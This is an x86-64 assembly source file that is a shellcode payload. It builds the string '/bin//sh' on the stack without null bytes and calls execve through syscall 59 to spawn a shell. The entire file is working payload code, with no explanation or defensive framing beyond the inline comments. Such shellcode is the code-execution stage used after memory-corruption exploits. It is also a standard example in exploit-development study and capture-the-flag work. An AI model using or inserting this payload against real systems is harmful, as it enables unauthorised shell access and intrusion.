.code64
.globl _start
.section .text

_start:
	#movq	$0xcccccccccccccccc, %rax
	#movq	$0xcccccccccccccccc, %rbx
	#movq	$0xcccccccccccccccc, %rcx
	#movq	$0xcccccccccccccccc, %rdx
	#movq	$0xcccccccccccccccc, %rsi
	#movq	$0xcccccccccccccccc, %rdi
	#movq	$0xcccccccccccccccc, %rbp

	pushq	$59
	popq	%rax							# rax = 59
	cltd									# rdx = 0
	pushq	%rdx							# null character
	movq	$0x68732f2f6e69622f, %rdi		# /bin//sh
	pushq	%rdi
	pushq	%rsp
	popq	%rdi							# rdi(argv[0]) = "/bin//sh"
	pushq	%rdx							# null pointer
	pushq	%rsp
	popq	%rdx							# rdx(envp) = {NULL}
	pushq	%rdi							# "/bin//sh"
	pushq	%rsp
	popq	%rsi							# rsi(argv) = {"/bin//sh", NULL}
	syscall									# execve("/bin//sh", ["/bin//sh", NULL], [NULL])
